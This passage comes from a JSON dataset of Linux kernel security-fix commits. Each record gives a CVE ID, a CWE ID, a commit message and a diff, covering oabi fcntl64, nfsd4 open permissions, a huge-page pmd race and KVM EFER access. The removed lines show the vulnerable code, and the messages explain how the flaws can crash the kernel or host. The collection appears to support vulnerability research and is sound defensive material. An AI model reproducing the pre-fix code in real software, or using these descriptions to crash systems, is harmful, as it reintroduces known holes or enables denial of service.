*\/\n-\tunsigned long local_arg = arg;\n-\tint ret;\n+\tstruct oabi_flock64 user;\n+\tmm_segment_t fs;\n+\tlong ret;\n+\n+\tif (copy_from_user(&user, (struct oabi_flock64 __user *)arg,\n+\t\t\t   sizeof(user)))\n+\t\treturn -EFAULT;\n+\tkernel.l_type\t= user.l_type;\n+\tkernel.l_whence\t= user.l_whence;\n+\tkernel.l_start\t= user.l_start;\n+\tkernel.l_len\t= user.l_len;\n+\tkernel.l_pid\t= user.l_pid;\n+\n+\tfs = get_fs();\n+\tset_fs(KERNEL_DS);\n+\tret = sys_fcntl64(fd, cmd, (unsigned long)&kernel);\n+\tset_fs(fs);\n+\n+\tif (!ret && (cmd == F_GETLK64 || cmd == F_OFD_GETLK)) {\n+\t\tuser.l_type\t= kernel.l_type;\n+\t\tuser.l_whence\t= kernel.l_whence;\n+\t\tuser.l_start\t= kernel.l_start;\n+\t\tuser.l_len\t= kernel.l_len;\n+\t\tuser.l_pid\t= kernel.l_pid;\n+\t\tif (copy_to_user((struct oabi_flock64 __user *)arg,\n+\t\t\t\t &user, sizeof(user)))\n+\t\t\tret = -EFAULT;\n+\t}\n+\treturn ret;\n+}\n \n+asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,\n+\t\t\t\t unsigned long arg)\n+{\n \tswitch (cmd) {\n \tcase F_OFD_GETLK:\n \tcase F_OFD_SETLK:\n@@ -209,39 +238,11 @@ asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,\n \tcase F_GETLK64:\n \tcase F_SETLK64:\n \tcase F_SETLKW64:\n-\t\tif (copy_from_user(&user, (struct oabi_flock64 __user *)arg,\n-\t\t\t\t   sizeof(user)))\n-\t\t\treturn -EFAULT;\n-\t\tkernel.l_type\t= user.l_type;\n-\t\tkernel.l_whence\t= user.l_whence;\n-\t\tkernel.l_start\t= user.l_start;\n-\t\tkernel.l_len\t= user.l_len;\n-\t\tkernel.l_pid\t= user.l_pid;\n-\t\tlocal_arg = (unsigned long)&kernel;\n-\t\tfs = get_fs();\n-\t\tset_fs(KERNEL_DS);\n-\t}\n-\n-\tret = sys_fcntl64(fd, cmd, local_arg);\n+\t\treturn do_locks(fd, cmd, arg);\n \n-\tswitch (cmd) {\n-\tcase F_GETLK64:\n-\t\tif (!ret) {\n-\t\t\tuser.l_type\t= kernel.l_type;\n-\t\t\tuser.l_whence\t= kernel.l_whence;\n-\t\t\tuser.l_start\t= kernel.l_start;\n-\t\t\tuser.l_len\t= kernel.l_len;\n-\t\t\tuser.l_pid\t= kernel.l_pid;\n-\t\t\tif (copy_to_user((struct oabi_flock64 __user *)arg,\n-\t\t\t\t\t &user, sizeof(user)))\n-\t\t\t\tret = -EFAULT;\n-\t\t}\n-\tcase F_SETLK64:\n-\tcase F_SETLKW64:\n-\t\tset_fs(fs);\n+\tdefault:\n+\t\treturn sys_fcntl64(fd, cmd, arg);\n \t}\n-\n-\treturn ret;\n }\n \n struct oabi_epoll_event {\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-3286","CWE_ID":"264","category":"security","commit_id":"81ac95c5569d7a60ab5db6c1ccec56c12b3ebcb5","commit_message":"From 81ac95c5569d7a60ab5db6c1ccec56c12b3ebcb5 Mon Sep 17 00:00:00 2001\nFrom: \"J. Bruce Fields\" <bfields@fieldses.org>\nDate: Wed, 8 Nov 2006 17:44:40 -0800\nSubject: [PATCH] nfsd4: fix open-create permissions\n\nIn the case where an open creates the file, we shouldn't be rechecking\npermissions to open the file; the open succeeds regardless of what the new\nfile's mode bits say.\n\nThis patch fixes the problem, but only by introducing yet another parameter\nto nfsd_create_v3.  This is ugly.  This will be fixed by later patches.\n\nSigned-off-by: J. Bruce Fields <bfields@citi.umich.edu>\nAcked-by: Neil Brown <neilb@suse.de>\nCc: Jeff Garzik <jeff@garzik.org>\nSigned-off-by: Andrew Morton <akpm@osdl.org>\nSigned-off-by: Linus Torvalds <torvalds@osdl.org>\n---\n fs\/nfsd\/nfs3proc.c        | 2 +-\n fs\/nfsd\/nfs4proc.c        | 6 ++++--\n fs\/nfsd\/vfs.c             | 4 +++-\n include\/linux\/nfsd\/nfsd.h | 2 +-\n 4 files changed, 9 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/fs\/nfsd\/nfs3proc.c b\/fs\/nfsd\/nfs3proc.c\nindex 64db601c2bd2..7f5bad0393b1 100644\n--- a\/fs\/nfsd\/nfs3proc.c\n+++ b\/fs\/nfsd\/nfs3proc.c\n@@ -258,7 +258,7 @@ nfsd3_proc_create(struct svc_rqst *rqstp, struct nfsd3_createargs *argp,\n \t\/* Now create the file and set attributes *\/\n \tnfserr = nfsd_create_v3(rqstp, dirfhp, argp->name, argp->len,\n \t\t\t\tattr, newfhp,\n-\t\t\t\targp->createmode, argp->verf, NULL);\n+\t\t\t\targp->createmode, argp->verf, NULL, NULL);\n \n \tRETURN_STATUS(nfserr);\n }\ndiff --git a\/fs\/nfsd\/nfs4proc.c b\/fs\/nfsd\/nfs4proc.c\nindex 4a73f5b2546f..50bc94243ca1 100644\n--- a\/fs\/nfsd\/nfs4proc.c\n+++ b\/fs\/nfsd\/nfs4proc.c\n@@ -93,6 +93,7 @@ do_open_lookup(struct svc_rqst *rqstp, struct svc_fh *current_fh, struct nfsd4_o\n {\n \tstruct svc_fh resfh;\n \t__be32 status;\n+\tint created = 0;\n \n \tfh_init(&resfh, NFS4_FHSIZE);\n \topen->op_truncate = 0;\n@@ -105,7 +106,7 @@ do_open_lookup(struct svc_rqst *rqstp, struct svc_fh *current_fh, struct nfsd4_o\n \t\tstatus = nfsd_create_v3(rqstp, current_fh, open->op_fname.data,\n \t\t\t\t\topen->op_fname.len, &open->op_iattr,\n \t\t\t\t\t&resfh, open->op_createmode,\n-\t\t\t\t\t(u32 *)open->op_verf.data, &open->op_truncate);\n+\t\t\t\t\t(u32 *)open->op_verf.data, &open->op_truncate, &created);\n \t} else {\n \t\tstatus = nfsd_lookup(rqstp, current_fh,\n \t\t\t\t     open->op_fname.data, open->op_fname.len, &resfh);\n@@ -122,7 +123,8 @@ do_open_lookup(struct svc_rqst *rqstp, struct svc_fh *current_fh, struct nfsd4_o\n \tmemcpy(open->op_stateowner->so_replay.rp_openfh,\n \t\t\t&resfh.fh_handle.fh_base, resfh.fh_handle.fh_size);\n \n-\tstatus = do_open_permission(rqstp, current_fh, open, MAY_NOP);\n+\tif (!created)\n+\t\tstatus = do_open_permission(rqstp, current_fh, open, MAY_NOP);\n \n out:\n \tfh_put(&resfh);\ndiff --git a\/fs\/nfsd\/vfs.c b\/fs\/nfsd\/vfs.c\nindex f21e917bb8ed..1a7ad8c983d1 100644\n--- a\/fs\/nfsd\/vfs.c\n+++ b\/fs\/nfsd\/vfs.c\n@@ -1237,7 +1237,7 @@ __be32\n nfsd_create_v3(struct svc_rqst *rqstp, struct svc_fh *fhp,\n \t\tchar *fname, int flen, struct iattr *iap,\n \t\tstruct svc_fh *resfhp, int createmode, u32 *verifier,\n-\t        int *truncp)\n+\t        int *truncp, int *created)\n {\n \tstruct dentry\t*dentry, *dchild = NULL;\n \tstruct inode\t*dirp;\n@@ -1331,6 +1331,8 @@ nfsd_create_v3(struct svc_rqst *rqstp, struct svc_fh *fhp,\n \thost_err = vfs_create(dirp, dchild, iap->ia_mode, NULL);\n \tif (host_err < 0)\n \t\tgoto out_nfserr;\n+\tif (created)\n+\t\t*created = 1;\n \n \tif (EX_ISSYNC(fhp->fh_export)) {\n \t\terr = nfserrno(nfsd_sync_dir(dentry));\ndiff --git a\/include\/linux\/nfsd\/nfsd.h b\/include\/linux\/nfsd\/nfsd.h\nindex eb231143d579..edb54c3171b3 100644\n--- a\/include\/linux\/nfsd\/nfsd.h\n+++ b\/include\/linux\/nfsd\/nfsd.h\n@@ -89,7 +89,7 @@ __be32\t\tnfsd_access(struct svc_rqst *, struct svc_fh *, u32 *, u32 *);\n __be32\t\tnfsd_create_v3(struct svc_rqst *, struct svc_fh *,\n \t\t\t\tchar *name, int len, struct iattr *attrs,\n \t\t\t\tstruct svc_fh *res, int createmode,\n-\t\t\t\tu32 *verifier, int *truncp);\n+\t\t\t\tu32 *verifier, int *truncp, int *created);\n __be32\t\tnfsd_commit(struct svc_rqst *, struct svc_fh *,\n \t\t\t\tloff_t, unsigned long);\n #endif \/* CONFIG_NFSD_V3 *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-1179","CWE_ID":"264","category":"security","commit_id":"4a1d704194a441bf83c636004a479e01360ec850","commit_message":"From 4a1d704194a441bf83c636004a479e01360ec850 Mon Sep 17 00:00:00 2001\nFrom: Andrea Arcangeli <aarcange@redhat.com>\nDate: Wed, 21 Mar 2012 16:33:42 -0700\nSubject: [PATCH] mm: thp: fix pmd_bad() triggering in code paths holding\n mmap_sem read mode\n\ncommit 1a5a9906d4e8d1976b701f889d8f35d54b928f25 upstream.\n\nIn some cases it may happen that pmd_none_or_clear_bad() is called with\nthe mmap_sem hold in read mode.  In those cases the huge page faults can\nallocate hugepmds under pmd_none_or_clear_bad() and that can trigger a\nfalse positive from pmd_bad() that will not like to see a pmd\nmaterializing as trans huge.\n\nIt's not khugepaged causing the problem, khugepaged holds the mmap_sem\nin write mode (and all those sites must hold the mmap_sem in read mode\nto prevent pagetables to go away from under them, during code review it\nseems vm86 mode on 32bit kernels requires that too unless it's\nrestricted to 1 thread per process or UP builds).  The race is only with\nthe huge pagefaults that can convert a pmd_none() into a\npmd_trans_huge().\n\nEffectively all these pmd_none_or_clear_bad() sites running with\nmmap_sem in read mode are somewhat speculative with the page faults, and\nthe result is always undefined when they run simultaneously.  This is\nprobably why it wasn't common to run into this.  For example if the\nmadvise(MADV_DONTNEED) runs zap_page_range() shortly before the page\nfault, the hugepage will not be zapped, if the page fault runs first it\nwill be zapped.\n\nAltering pmd_bad() not to error out if it finds hugepmds won't be enough\nto fix this, because zap_pmd_range would then proceed to call\nzap_pte_range (which would be incorrect if the pmd become a\npmd_trans_huge()).\n\nThe simplest way to fix this is to read the pmd in the local stack\n(regardless of what we read, no need of actual CPU barriers, only\ncompiler barrier needed), and be sure it is not changing under the code\nthat computes its value.  Even if the real pmd is changing under the\nvalue we hold on the stack, we don't care.  If we actually end up in\nzap_pte_range it means the pmd was not none already and it was not huge,\nand it can't become huge from under us (khugepaged locking explained\nabove).\n\nAll we need is to enforce that there is no way anymore that in a code\npath like below, pmd_trans_huge can be false, but pmd_none_or_clear_bad\ncan run into a hugepmd.  The overhead of a barrier() is just a compiler\ntweak and should not be measurable (I only added it for THP builds).  I\ndon't exclude different compiler versions may have prevented the race\ntoo by caching the value of *pmd on the stack (that hasn't been\nverified, but it wouldn't be impossible considering\npmd_none_or_clear_bad, pmd_bad, pmd_trans_huge, pmd_none are all inlines\nand there's no external function called in between pmd_trans_huge and\npmd_none_or_clear_bad).\n\n\t\tif (pmd_trans_huge(*pmd)) {\n\t\t\tif (next-addr != HPAGE_PMD_SIZE) {\n\t\t\t\tVM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem));\n\t\t\t\tsplit_huge_page_pmd(vma->vm_mm, pmd);\n\t\t\t} else if (zap_huge_pmd(tlb, vma, pmd, addr))\n\t\t\t\tcontinue;\n\t\t\t\/* fall through *\/\n\t\t}\n\t\tif (pmd_none_or_clear_bad(pmd))\n\nBecause this race condition could be exercised without special\nprivileges this was reported in CVE-2012-1179.\n\nThe race was identified and fully explained by Ulrich who debugged it.\nI'm quoting his accurate explanation below, for reference.\n\n====== start quote =======\n      mapcount 0 page_mapcount 1\n      kernel BUG at mm\/huge_memory.c:1384!\n\n    At some point prior to the panic, a \"bad pmd ...\" message similar to the\n    following is logged on the console:\n\n      mm\/memory.c:145: bad pmd ffff8800376e1f98(80000000314000e7).\n\n    The \"bad pmd ...\" message is logged by pmd_clear_bad() before it clears\n    the page's PMD table entry.\n\n        143 void pmd_clear_bad(pmd_t *pmd)\n        144 {\n    ->  145         pmd_ERROR(*pmd);\n        146         pmd_clear(pmd);\n        147 }\n\n    After the PMD table entry has been cleared, there is an inconsistency\n    between the actual number of PMD table entries that are mapping the page\n    and the page's map count (_mapcount field in struct page). When the page\n    is subsequently reclaimed, __split_huge_page() detects this inconsistency.\n\n       1381         if (mapcount != page_mapcount(page))\n       1382                 printk(KERN_ERR \"mapcount %d page_mapcount %d\\n\",\n       1383                        mapcount, page_mapcount(page));\n    -> 1384         BUG_ON(mapcount != page_mapcount(page));\n\n    The root cause of the problem is a race of two threads in a multithreaded\n    process. Thread B incurs a page fault on a virtual address that has never\n    been accessed (PMD entry is zero) while Thread A is executing an madvise()\n    system call on a virtual address within the same 2 MB (huge page) range.\n\n               virtual address space\n              .---------------------.\n              |                     |\n              |                     |\n            .-|---------------------|\n            | |                     |\n            | |                     |<-- B(fault)\n            | |                     |\n      2 MB  | |\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|-.\n      huge <  |\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|  > A(range)\n      page  | |\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|-'\n            | |                     |\n            | |                     |\n            '-|---------------------|\n              |                     |\n              |                     |\n              '---------------------'\n\n    - Thread A is executing an madvise(..., MADV_DONTNEED) system call\n      on the virtual address range \"A(range)\" shown in the picture.\n\n    sys_madvise\n      \/\/ Acquire the semaphore in shared mode.\n      down_read(&current->mm->mmap_sem)\n      ...\n      madvise_vma\n        switch (behavior)\n        case MADV_DONTNEED:\n             madvise_dontneed\n               zap_page_range\n                 unmap_vmas\n                   unmap_page_range\n                     zap_pud_range\n                       zap_pmd_range\n                         \/\/\n                         \/\/ Assume that this huge page has never been accessed.\n                         \/\/ I.e. content of the PMD entry is zero (not mapped).\n                         \/\/\n                         if (pmd_trans_huge(*pmd)) {\n                             \/\/ We don't get here due to the above assumption.\n                         }\n                         \/\/\n                         \/\/ Assume that Thread B incurred a page fault and\n             .---------> \/\/ sneaks in here as shown below.\n             |           \/\/\n             |           if (pmd_none_or_clear_bad(pmd))\n             |               {\n             |                 if (unlikely(pmd_bad(*pmd)))\n             |                     pmd_clear_bad\n             |                     {\n             |                       pmd_ERROR\n             |                         \/\/ Log \"bad pmd ...\" message here.\n             |                       pmd_clear\n             |                         \/\/ Clear the page's PMD entry.\n             |                         \/\/ Thread B incremented the map count\n             |                         \/\/ in page_add_new_anon_rmap(), but\n             |                         \/\/ now the page is no longer mapped\n             |                         \/\/ by a PMD entry (-> inconsistency).\n             |                     }\n             |               }\n             |\n             v\n    - Thread B is handling a page fault on virtual address \"B(fault)\" shown\n      in the picture.\n\n    ...\n    do_page_fault\n      __do_page_fault\n        \/\/ Acquire the semaphore in shared mode.\n        down_read_trylock(&mm->mmap_sem)\n        ...\n        handle_mm_fault\n          if (pmd_none(*pmd) && transparent_hugepage_enabled(vma))\n              \/\/ We get here due to the above assumption (PMD entry is zero).\n              do_huge_pmd_anonymous_page\n                alloc_hugepage_vma\n                  \/\/ Allocate a new transparent huge page here.\n                ...\n                __do_huge_pmd_anonymous_page\n                  ...\n                  spin_lock(&mm->page_table_lock)\n                  ...\n                  page_add_new_anon_rmap\n                    \/\/ Here we increment the page's map count (starts at -1).\n                    atomic_set(&page->_mapcount, 0)\n                  set_pmd_at\n                    \/\/ Here we set the page's PMD entry which will be cleared\n                    \/\/ when Thread A calls pmd_clear_bad().\n                  ...\n                  spin_unlock(&mm->page_table_lock)\n\n    The mmap_sem does not prevent the race because both threads are acquiring\n    it in shared mode (down_read).  Thread B holds the page_table_lock while\n    the page's map count and PMD table entry are updated.  However, Thread A\n    does not synchronize on that lock.\n\n====== end quote =======\n\n[akpm@linux-foundation.org: checkpatch fixes]\nReported-by: Ulrich Obergfell <uobergfe@redhat.com>\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nAcked-by: Johannes Weiner <hannes@cmpxchg.org>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Hugh Dickins <hughd@google.com>\nCc: Dave Jones <davej@redhat.com>\nAcked-by: Larry Woodman <lwoodman@redhat.com>\nAcked-by: Rik van Riel <riel@redhat.com>\nCc: Mark Salter <msalter@redhat.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n arch\/x86\/kernel\/vm86_32.c     |  2 ++\n fs\/proc\/task_mmu.c            |  9 ++++++\n include\/asm-generic\/pgtable.h | 61 +++++++++++++++++++++++++++++++++++\n mm\/memcontrol.c               |  4 +++\n mm\/memory.c                   | 16 ++++++---\n mm\/mempolicy.c                |  2 +-\n mm\/mincore.c                  |  2 +-\n mm\/pagewalk.c                 |  2 +-\n mm\/swapfile.c                 |  4 +--\n 9 files changed, 92 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kernel\/vm86_32.c b\/arch\/x86\/kernel\/vm86_32.c\nindex b466cab5ba15d..328cb37bb8279 100644\n--- a\/arch\/x86\/kernel\/vm86_32.c\n+++ b\/arch\/x86\/kernel\/vm86_32.c\n@@ -172,6 +172,7 @@ static void mark_screen_rdonly(struct mm_struct *mm)\n \tspinlock_t *ptl;\n \tint i;\n \n+\tdown_write(&mm->mmap_sem);\n \tpgd = pgd_offset(mm, 0xA0000);\n \tif (pgd_none_or_clear_bad(pgd))\n \t\tgoto out;\n@@ -190,6 +191,7 @@ static void mark_screen_rdonly(struct mm_struct *mm)\n \t}\n \tpte_unmap_unlock(pte, ptl);\n out:\n+\tup_write(&mm->mmap_sem);\n \tflush_tlb();\n }\n \ndiff --git a\/fs\/proc\/task_mmu.c b\/fs\/proc\/task_mmu.c\nindex 7dcd2a250495d..3efa7253523e7 100644\n--- a\/fs\/proc\/task_mmu.c\n+++ b\/fs\/proc\/task_mmu.c\n@@ -409,6 +409,9 @@ static int smaps_pte_range(pmd_t *pmd, unsigned long addr, unsigned long end,\n \t} else {\n \t\tspin_unlock(&walk->mm->page_table_lock);\n \t}\n+\n+\tif (pmd_trans_unstable(pmd))\n+\t\treturn 0;\n \t\/*\n \t * The mmap_sem held all the way back in m_start() is what\n \t * keeps khugepaged out of here and from collapsing things\n@@ -507,6 +510,8 @@ static int clear_refs_pte_range(pmd_t *pmd, unsigned long addr,\n \tstruct page *page;\n \n \tsplit_huge_page_pmd(walk->mm, pmd);\n+\tif (pmd_trans_unstable(pmd))\n+\t\treturn 0;\n \n \tpte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);\n \tfor (; addr != end; pte++, addr += PAGE_SIZE) {\n@@ -670,6 +675,8 @@ static int pagemap_pte_range(pmd_t *pmd, unsigned long addr, unsigned long end,\n \tint err = 0;\n \n \tsplit_huge_page_pmd(walk->mm, pmd);\n+\tif (pmd_trans_unstable(pmd))\n+\t\treturn 0;\n \n \t\/* find the first VMA at or above 'addr' *\/\n \tvma = find_vma(walk->mm, addr);\n@@ -961,6 +968,8 @@ static int gather_pte_stats(pmd_t *pmd, unsigned long addr,\n \t\tspin_unlock(&walk->mm->page_table_lock);\n \t}\n \n+\tif (pmd_trans_unstable(pmd))\n+\t\treturn 0;\n \torig_pte = pte = pte_offset_map_lock(walk->mm, pmd, addr, &ptl);\n \tdo {\n \t\tstruct page *page = can_gather_numa_stats(*pte, md->vma, addr);\ndiff --git a\/include\/asm-generic\/pgtable.h b\/include\/asm-generic\/pgtable.h\nindex 76bff2bff15e3..a03c098b0cce9 100644\n--- a\/include\/asm-generic\/pgtable.h\n+++ b\/include\/asm-generic\/pgtable.h\n@@ -425,6 +425,8 @@ extern void untrack_pfn_vma(struct vm_area_struct *vma, unsigned long pfn,\n \t\t\t\tunsigned long size);\n #endif\n \n+#ifdef CONFIG_MMU\n+\n #ifndef CONFIG_TRANSPARENT_HUGEPAGE\n static inline int pmd_trans_huge(pmd_t pmd)\n {\n@@ -441,7 +443,66 @@ static inline int pmd_write(pmd_t pmd)\n \treturn 0;\n }\n #endif \/* __HAVE_ARCH_PMD_WRITE *\/\n+#endif \/* CONFIG_TRANSPARENT_HUGEPAGE *\/\n+\n+\/*\n+ * This function is meant to be used by sites walking pagetables with\n+ * the mmap_sem hold in read mode to protect against MADV_DONTNEED and\n+ * transhuge page faults. MADV_DONTNEED can convert a transhuge pmd\n+ * into a null pmd and the transhuge page fault can convert a null pmd\n+ * into an hugepmd or into a regular pmd (if the hugepage allocation\n+ * fails). While holding the mmap_sem in read mode the pmd becomes\n+ * stable and stops changing under us only if it's not null and not a\n+ * transhuge pmd. When those races occurs and this function makes a\n+ * difference vs the standard pmd_none_or_clear_bad, the result is\n+ * undefined so behaving like if the pmd was none is safe (because it\n+ * can return none anyway). The compiler level barrier() is critically\n+ * important to compute the two checks atomically on the same pmdval.\n+ *\/\n+static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t *pmd)\n+{\n+\t\/* depend on compiler for an atomic pmd read *\/\n+\tpmd_t pmdval = *pmd;\n+\t\/*\n+\t * The barrier will stabilize the pmdval in a register or on\n+\t * the stack so that it will stop changing under the code.\n+\t *\/\n+#ifdef CONFIG_TRANSPARENT_HUGEPAGE\n+\tbarrier();\n+#endif\n+\tif (pmd_none(pmdval))\n+\t\treturn 1;\n+\tif (unlikely(pmd_bad(pmdval))) {\n+\t\tif (!pmd_trans_huge(pmdval))\n+\t\t\tpmd_clear_bad(pmd);\n+\t\treturn 1;\n+\t}\n+\treturn 0;\n+}\n+\n+\/*\n+ * This is a noop if Transparent Hugepage Support is not built into\n+ * the kernel. Otherwise it is equivalent to\n+ * pmd_none_or_trans_huge_or_clear_bad(), and shall only be called in\n+ * places that already verified the pmd is not none and they want to\n+ * walk ptes while holding the mmap sem in read mode (write mode don't\n+ * need this). If THP is not enabled, the pmd can't go away under the\n+ * code even if MADV_DONTNEED runs, but if THP is enabled we need to\n+ * run a pmd_trans_unstable before walking the ptes after\n+ * split_huge_page_pmd returns (because it may have run when the pmd\n+ * become null, but then a page fault can map in a THP and not a\n+ * regular page).\n+ *\/\n+static inline int pmd_trans_unstable(pmd_t *pmd)\n+{\n+#ifdef CONFIG_TRANSPARENT_HUGEPAGE\n+\treturn pmd_none_or_trans_huge_or_clear_bad(pmd);\n+#else\n+\treturn 0;\n #endif\n+}\n+\n+#endif \/* CONFIG_MMU *\/\n \n #endif \/* !__ASSEMBLY__ *\/\n \ndiff --git a\/mm\/memcontrol.c b\/mm\/memcontrol.c\nindex 58a08fc7414aa..cd412fc9b802c 100644\n--- a\/mm\/memcontrol.c\n+++ b\/mm\/memcontrol.c\n@@ -5234,6 +5234,8 @@ static int mem_cgroup_count_precharge_pte_range(pmd_t *pmd,\n \tspinlock_t *ptl;\n \n \tsplit_huge_page_pmd(walk->mm, pmd);\n+\tif (pmd_trans_unstable(pmd))\n+\t\treturn 0;\n \n \tpte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);\n \tfor (; addr != end; pte++, addr += PAGE_SIZE)\n@@ -5396,6 +5398,8 @@ static int mem_cgroup_move_charge_pte_range(pmd_t *pmd,\n \tspinlock_t *ptl;\n \n \tsplit_huge_page_pmd(walk->mm, pmd);\n+\tif (pmd_trans_unstable(pmd))\n+\t\treturn 0;\n retry:\n \tpte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);\n \tfor (; addr != end; addr += PAGE_SIZE) {\ndiff --git a\/mm\/memory.c b\/mm\/memory.c\nindex fa2f04e0337c4..10b4ddadc37eb 100644\n--- a\/mm\/memory.c\n+++ b\/mm\/memory.c\n@@ -1247,16 +1247,24 @@ static inline unsigned long zap_pmd_range(struct mmu_gather *tlb,\n \tdo {\n \t\tnext = pmd_addr_end(addr, end);\n \t\tif (pmd_trans_huge(*pmd)) {\n-\t\t\tif (next-addr != HPAGE_PMD_SIZE) {\n+\t\t\tif (next - addr != HPAGE_PMD_SIZE) {\n \t\t\t\tVM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem));\n \t\t\t\tsplit_huge_page_pmd(vma->vm_mm, pmd);\n \t\t\t} else if (zap_huge_pmd(tlb, vma, pmd, addr))\n-\t\t\t\tcontinue;\n+\t\t\t\tgoto next;\n \t\t\t\/* fall through *\/\n \t\t}\n-\t\tif (pmd_none_or_clear_bad(pmd))\n-\t\t\tcontinue;\n+\t\t\/*\n+\t\t * Here there can be other concurrent MADV_DONTNEED or\n+\t\t * trans huge page faults running, and if the pmd is\n+\t\t * none or trans huge it can change under us. This is\n+\t\t * because MADV_DONTNEED holds the mmap_sem in read\n+\t\t * mode.\n+\t\t *\/\n+\t\tif (pmd_none_or_trans_huge_or_clear_bad(pmd))\n+\t\t\tgoto next;\n \t\tnext = zap_pte_range(tlb, vma, pmd, addr, next, details);\n+next:\n \t\tcond_resched();\n \t} while (pmd++, addr = next, addr != end);\n \ndiff --git a\/mm\/mempolicy.c b\/mm\/mempolicy.c\nindex 47296fee23dba..0a37570676314 100644\n--- a\/mm\/mempolicy.c\n+++ b\/mm\/mempolicy.c\n@@ -512,7 +512,7 @@ static inline int check_pmd_range(struct vm_area_struct *vma, pud_t *pud,\n \tdo {\n \t\tnext = pmd_addr_end(addr, end);\n \t\tsplit_huge_page_pmd(vma->vm_mm, pmd);\n-\t\tif (pmd_none_or_clear_bad(pmd))\n+\t\tif (pmd_none_or_trans_huge_or_clear_bad(pmd))\n \t\t\tcontinue;\n \t\tif (check_pte_range(vma, pmd, addr, next, nodes,\n \t\t\t\t    flags, private))\ndiff --git a\/mm\/mincore.c b\/mm\/mincore.c\nindex 636a86876ff21..936b4cee8cb1e 100644\n--- a\/mm\/mincore.c\n+++ b\/mm\/mincore.c\n@@ -164,7 +164,7 @@ static void mincore_pmd_range(struct vm_area_struct *vma, pud_t *pud,\n \t\t\t}\n \t\t\t\/* fall through *\/\n \t\t}\n-\t\tif (pmd_none_or_clear_bad(pmd))\n+\t\tif (pmd_none_or_trans_huge_or_clear_bad(pmd))\n \t\t\tmincore_unmapped_range(vma, addr, next, vec);\n \t\telse\n \t\t\tmincore_pte_range(vma, pmd, addr, next, vec);\ndiff --git a\/mm\/pagewalk.c b\/mm\/pagewalk.c\nindex 2f5cf10ff6607..aa9701e12714a 100644\n--- a\/mm\/pagewalk.c\n+++ b\/mm\/pagewalk.c\n@@ -59,7 +59,7 @@ static int walk_pmd_range(pud_t *pud, unsigned long addr, unsigned long end,\n \t\t\tcontinue;\n \n \t\tsplit_huge_page_pmd(walk->mm, pmd);\n-\t\tif (pmd_none_or_clear_bad(pmd))\n+\t\tif (pmd_none_or_trans_huge_or_clear_bad(pmd))\n \t\t\tgoto again;\n \t\terr = walk_pte_range(pmd, addr, next, walk);\n \t\tif (err)\ndiff --git a\/mm\/swapfile.c b\/mm\/swapfile.c\nindex d999f090dfdab..f31b29d2ca4e5 100644\n--- a\/mm\/swapfile.c\n+++ b\/mm\/swapfile.c\n@@ -932,9 +932,7 @@ static inline int unuse_pmd_range(struct vm_area_struct *vma, pud_t *pud,\n \tpmd = pmd_offset(pud, addr);\n \tdo {\n \t\tnext = pmd_addr_end(addr, end);\n-\t\tif (unlikely(pmd_trans_huge(*pmd)))\n-\t\t\tcontinue;\n-\t\tif (pmd_none_or_clear_bad(pmd))\n+\t\tif (pmd_none_or_trans_huge_or_clear_bad(pmd))\n \t\t\tcontinue;\n \t\tret = unuse_pte_range(vma, pmd, addr, next, entry, page);\n \t\tif (ret)\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-1242","CWE_ID":"264","category":"security","commit_id":"16175a796d061833aacfbd9672235f2d2725df65","commit_message":"From 16175a796d061833aacfbd9672235f2d2725df65 Mon Sep 17 00:00:00 2001\nFrom: Avi Kivity <avi@redhat.com>\nDate: Mon, 23 Mar 2009 22:13:44 +0200\nSubject: KVM: VMX: Don't allow uninhibited access to EFER on i386\n\nvmx_set_msr() does not allow i386 guests to touch EFER, but they can still\ndo so through the default: label in the switch.  If they set EFER_LME, they\ncan oops the host.\n\nFix by having EFER access through the normal channel (which will check for\nEFER_LME) even on i386.\n\nReported-and-tested-by: Benjamin Gilbert <bgilbert@cs.cmu.edu>\nCc: stable@kernel.org\nSigned-off-by: Avi Kivity <avi@redhat.com>\n---\n arch\/x86\/kvm\/vmx.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex 48063a0aa243..bb481330716f 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -936,11 +936,11 @@ static int vmx_set_msr(struct kvm_vcpu *vcpu, u32 msr_index, u64 data)\n \tint ret = 0;\n \n \tswitch (msr_index) {\n-#ifdef CONFIG_X86_64\n \tcase MSR_EFER:\n \t\tvmx_load_host_state(vmx);\n \t\tret = kvm_set_msr_common(vcpu, msr_index, data);\n \t\tbreak;\n+#ifdef CONFIG_X86_64\n \tcase MSR_FS_BASE:\n \t\tvmcs_writel(GUEST_FS_BASE, data);\n \t\tbreak;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-3466","CWE_ID":"264","category":"security","commit_id":"51606f299e5ee9d48096db0a5957efe26cbf7cc3","commit_message":"From 51606f299e5ee9d48096db0a5957efe26cbf7cc3 Mon Sep 17 00:00:00 2001\nFrom: Stef Walter <stefw@gnome.org>\nDate: Wed, 8 Aug 2012 06:06:58 +0200\nSubject: [PATCH] gpg-agent: 